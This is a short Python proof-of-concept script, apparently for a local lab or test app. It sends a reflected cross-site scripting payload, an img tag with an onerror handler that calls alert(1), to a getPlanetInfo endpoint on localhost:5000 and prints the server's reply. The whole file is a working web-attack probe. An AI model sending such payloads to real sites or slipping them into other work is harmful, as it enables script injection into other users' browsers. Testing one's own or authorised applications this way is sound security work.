import requests

# Target URL
target_url = "http://localhost:5000/"

# XSS payload
payload = "<<img src='x' onerror='alert(1)'>>"

# Craft the malicious URL with the payload
malicious_url = f"{target_url}getPlanetInfo?planet={payload}"

# Send the request
response = requests.get(malicious_url)

# Print the response content
print(response.text)
